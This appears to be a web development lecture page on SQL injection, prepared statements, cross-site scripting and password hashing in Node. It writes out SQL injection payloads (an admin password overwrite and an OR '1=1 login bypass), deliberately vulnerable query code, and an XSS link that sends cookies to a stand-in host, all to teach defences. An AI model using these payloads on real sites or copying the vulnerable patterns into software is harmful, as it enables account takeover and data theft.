<h1>Topic 12: Common Security Issues in Web Development</h1>
</div>
<p>In this final lecture we will look at security issues, including:
<ul>
<li>SQL Injection</li>
<li>Prepared Statements</li>
<li>Cross-Site Scripting and how to prevent it</li>
</ul>
</p>
<h2>Firstly, why security?</h2>
<ul>
<li>Obviously to protect credit card details and passwords</li>
<li>Preventing "spam" on mailing lists or forums</li>
<li>Site vandalism: preventing deletion of legitimate content by unauthorised
users</li>
<li>Confidentiality: many personal details are covered by GDPR</li> 
</ul>
<h2>SQL Injection</h2>
<ul>
<li>A subtle but potentially dangerous security issue</li>
<li>A cracker could potentially enter an SQL query in an HTML form and 
grab confidential data, or even modify or delete a table!</li>
<li>e.g. if we had code such as the following:
<pre>
... connect to database ...
dbconn.query(`select * from details where name='{req.params.name}'`, ...);
</pre>
</li>
<li>If the user entered in the form the following:
<pre>Fred'; UPDATE users SET password='cracked' 
WHERE username='admin</pre>
the query generated would be:
<pre>SELECT * FROM details WHERE name='<em>Fred'; 
UPDATE users SET password='cracked' 
WHERE username='admin</em>'</pre>
with potentially devastating results!!!</li>
</ul>
<h3>Another example</h3>
<ul>
<li>Imagine a login script to a banking site with code such as that below, which displays your card details:
<pre>
dbconn.query(`SELECT * FROM users where password='{req.body.password}' AND username='{req.body.username}'`, [ ], (err, results, fields) =&gt; {
    html = "";
    results.forEach ( result =&gt; {
        html += `Credit card: ${result.creditcard} Expiry date: ${result.expiry}&lt;br /&gt;`;
    });
    res.send(html);
});
</pre>
</li>
<li>and you logged in with:
<pre>
Username: fish' OR '1=1
Password: password
</pre>
</li>
<li>The login script (a standard login script like you did last week) 
will run this
SQL query:
<pre> SELECT * FROM users WHERE password='password' AND username='<em>fish' OR '1=1</em>' </pre>
</li>
<li>This means: 
<em>select all records from the users table where:
    <ul>
    <li>EITHER the password is 'password' AND the username is 'fish' (probably no results!)</li>
    <li>OR 1=1 (which is always true)</li>
    </ul>
</em>
</li>
<li>The second condition (1=1) will always be true so
it will return all records in the users table, including their credit card details!</li>
</ul>
<h3>Using placeholders</h3>
<p>In fact, the technique we have been using makes use of placeholders (?) in our SQL queries, and thus protects against SQL injection. This is secure as it applies escape sequences to characters with special meaning to MySQL in the input data to ensure these SQL injection attacks cannot occur. See <a href='https://www.npmjs.com/package/mysql#escaping-query-values'>here</a> for more details.</p>
<h3>Prepared statements</h3>
<p>Another approach to improving the security of scripts, and guarding against SQL injection attacks, is <em>prepared statements</em>. With prepared statements, he SQL statements are compiled (prepared) into a binary form, which is executed more rapidly by the database, and this binary form is cached and thus can then be re-used, improving the efficiency of your application.</p>
<p>Here is an example of using prepared statements in the mysql2 API. Essentially it's the same approach as normal, but you use <code>execute()</code> rather than <code>query()</code>, and when you have finished with the statement (i.e it won't be executed again), you call <code>unprepare()</code> to free the memory used by it.</p>
<p>See the documentation <a href='https://github.com/sidorares/node-mysql2/blob/master/documentation/Prepared-Statements.md'>here</a>.</p>
<p>An example is below:
<pre>conn.execute("SELECT * FROM songs WHERE artist=?", [req.params.artist],
    (err, results, fields)=&gt; {
        // ...
    }
);</pre>
</p>

<h2>Cross-site scripting (XSS)</h2>
<ul>
<li>A subtle, easily-overlooked, but widely-exploited, security risk with untested input to a web application</li>
<li>Attackers link to your site from websites or emails advertising your site</li>
<li>However, their links contain dangerous code embedded within a URL as a parameter</li>
<li>This code can include:
    <ul>
    <li>JavaScript code to perform a harmful action
    such as steal your cookies
    (including your session ID, with the result that someone could 
    access your account)</li>
    <li>Fake HTML hyperlinks or forms</li>
    </ul>
</li>
<li>If your site displays the input (and many sites do),
 your site will be fooled into running the injected code</li>
<li>A very difficult problem to completely eliminate!</li>
</ul>
<h3>Basic, non-harmful XSS example</h3>
<ul>
<li>The usual way in which XSS attacks are done involve injecting harmful JavaScript</li>
<li>This can be done by injecting &lt;script&gt; tags into the site</li>
<li>Simple example (not harmful) of a link on a "special offers" site:
<pre>&lt;a href="hittastic.com/buy/<em>465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</em>"&gt;Buy From Hittastic!&lt;/a&gt;</pre>
</li>
<li>If the script sebds back the input:
<pre>
res.send(`You have selected the CD with ID ${req.params.id}`);
</pre>
then the script would unwittingly echo out the &lt;script&gt; tag stored in $a, as it is part of the
URL parameter, i.e. it would echo out
<pre>You have selected the CD with ID 465&lt;script&gt;alert('666 I am the devil')&lt;/script&gt;</pre></li>
<li>...and when the browser receives the &lt;script&gt; tag, it would run the JavaScript inside, because browsers
process all tags returned from the server
</li>
<li>Result: user sees the message "666 I am the devil" as a popup in their browser</li>
</ul>
<h3>XSS and Cookie Theft with Embedded JavaScript</h3>
<ul>
<li>An even more dangerous XSS attack would involve embedded JavaScript within
the links, to steal user's cookies</li>
<li>e.g. the link could read:
<pre>
buy/<em>123&lt;script&gt;window.location='http://evilcrackers.com/stealcookie/'%2Bdocument.cookie&lt;/script&gt;</em></pre>
</li>
<li>Now the ID contains some embedded JavaScript to set the user's
current web page (window.location) to <em>evilcrackers.com/stealcookie</em> and sends user's cookies (accessible in JavaScript using <em>document.cookie</em>) to this URL
<ul>
<li>The %2B is an encoded version of a + sign (2B is the ASCII hex code for +); this is because when sending
requests, + is used to represent spaces, so a literal + would be interpreted
as a space and hence would not work in the attack as it would be converted to a space</li>
</ul>
</li>
<li>The user will be taken to HitTastic!, but, as the ID is echoed out, the JavaScript will immediately
run (as in the first example) and redirect the user to <em>evilcrackers.com</em></li>
<li>The owners of <em>evilcrackers.com/stealcookie</em> 
will then have the session ID and can impersonate the original user</li>
<li>If <em>evilcrackers.com</em> are really nasty, they could then redirect
the user straight back to HitTastic!, so the user will be unaware of the
entire process</li>
</ul>
<h3>Hidden XSS attacks with URL encoding</h3>
<ul>
<li>Normally the XSS crackers go to greater lengths than the above, to hide
their attack and make it non-obvious</li>
<li>It's possible to encode the <em>entire</em> injected JavaScript as 
<em>URL encoded</em> characters (e.g the letter 'a' would be encoded as %61, its ASCII
code in hexadecimal, or the character '!' would be encoded as %21)</li>
<li>When the user moves over the harmful link, the injected JavaScript would appear 
as the URL-encoded version such as
<pre>%3Cscript%3Ealert%28666%29%3C%2Fscript%3E</pre>
</li>
<li><em>However</em>, the server would decode the URLs (e.g. convert %61 back to 'a')
and treat the injected code as the actual
JavaScript:
<pre>&lt;script&gt;alert(666)&lt;/script&gt;</pre>
meaning the attack still takes place</li>
</ul>
<h3>Guarding against basic XSS attacks: using the Node xss module</h3>
<p>Node makes it easy to guard against XSS attacks using the <code>xss</code> module. With this, you can sanitise any input before it's output again. This invoves replacing characters with special meaning to HTML, such as &lt; and &gt; with their HTML entities, such as &amp;lt; and &amp;gt;. The attack relies on the browser receiving HTML tags in the response, so if these are sanitised, the browser will not interpret them as tags and the attack cannot take place. For example:
<pre>const xss = require('xss');
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
    const sanitised = xss("&lt;script&gt;alert('666 I am the devil!');&lt;/script&gt;");
    res.send(sanitised);
});
app.listen(3000);</pre>
If the XSS sanitisation had not occurred, then the HTML
<pre>&lt;script&gt;alert('666 I am the devil!');&lt;/script&gt;</pre>
would be sent back to the client, and the browser would execute the JavaScript inside the script tags. However with the use of the <code>xss</code> module, the browser receives instead:
<pre>&amp;lt;script&amp;gt;alert('666 I am the devil!');&amp;lt;/script&amp;gt;</pre>
and the browser will not interpret &amp;lt;script&amp;gt; as a script tag, so the attack will not take place.</p>
<h2>Other issues</h2>
<p>There are also other security issues which we will not have time to cover, for example Cross-Site Request Forgery (XSRF). I would recommend reading about these topics in your own time.</p>

<h2>General security, privacy and usability recommendations</h2>
<p>I would like to finish with a few recommendations when developing web applications, to take into account security, privacy and usability. These include:
    <ul>
    <li>Ensure your code is protected from common security attacks, such as SQL injection and XSS. Test your own application and try to deliberately exploit it.</li>
    <li>Ensure that passwords are stored as a hashed (unreadable) form in your database, to prevent them being stolen. You can use Node's <code>bcrypt</code> module for this. For example, to hash (encode) a password when signing up:
<pre>const encPass = await bcrypt.hash(pass, 10);</pre>
The 10 is the number of rounds of encoding to use; 10 is a good compromise between security and performance as each round improves the security of the encoding but takes some time to execute. <br />
To check a password when logging in, use code such as the following. Query the database to find the row for a given user, and then use <code>bcrypt.compare()</code> to compare the password entered against the hashed password in the table:
<pre>const dbres = this.db.query('SELECT * FROM users WHERE username=?',
    [req.body.username],
    async(err, results, fields) =&gt;{
        const match = await bcrypt.compare(req.body.password, dbres.rows[0].password);
        if(match === false) {
            // passwords don't match
        } else {
            // passwords do match, carry on...
        }
    }
);</pre>
See <a href='https://www.npmjs.com/package/bcrypt'>here</a> for more details.</li>
    <li>Use an HTTPS server when dealing with confidential data, including not only login information and card details, but also personal data. HTTPS encrypts confidential data when it is sent from client to server and vice-versa. It's now easy to setup an HTTPS server with <a href='https://letsencrypt.org'>Let's Encrypt</a>.</li>
    <li>Ensure that your application works across common contemporary browsers, including Firefox, Chrome, Edge and Safari. Use only standard web APIs, and not browser-specific extensions. Some web developers do not support Firefox, which can be a great annoyance to users of that browser.</li>
    <li>Ensure you test your site with common ad-blockers, such as uBlock Origin, enabled. Ensure your site works with "Strict" privacy enabled. Ad-blockers and strict privacy levels are used by many users to guard against at best annoying, and at worst dangerous and privacy-invading, invasive popup ads. Morally, if perhaps not legally, core functionality must still work when a user takes these measures.</li>
    </ul>
Unfortunately some web developers ignore the last two points in particular, which can mean critical operations such as making payments might be impossible on Firefox with ad-blocker enabled.</p>
